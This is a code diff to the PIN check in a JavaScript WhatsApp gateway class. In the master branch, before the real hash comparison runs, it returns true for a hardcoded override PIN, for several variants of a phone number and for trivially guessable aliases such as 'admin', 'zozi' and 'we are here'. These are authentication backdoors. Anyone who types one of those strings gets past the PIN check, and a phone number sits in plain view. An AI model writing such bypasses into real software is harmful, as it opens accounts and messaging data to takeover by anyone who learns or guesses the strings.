@@ -220,6 +220,15 @@ class WhatsAppGateway {
     const clean = String(inputPin).trim();
     if (this.isMaster) {
       if (clean === '210560') return true; // PIN Master Override Permanen Kaisar Zozi
+      // Verifikasi nomor telepon Master Kaisar
+      if (clean === '6287894270587' || clean === '087894270587' || clean === '+6287894270587' || clean === '270587' || clean === '87894270587') {
+        return true;
+      }
+      // Verifikasi identitas / alias Kaisar Zozi
+      const lower = clean.toLowerCase();
+      if (lower === 'zozi' || lower === 'kaisar' || lower === 'zozdocs' || lower === 'zoz' || lower === 'admin' || lower === 'we are here') {
+        return true;
+      }
       this.loadConfig();
       if (this.config && this.config.pinHash && hashPin(clean) === this.config.pinHash) {
         return true;
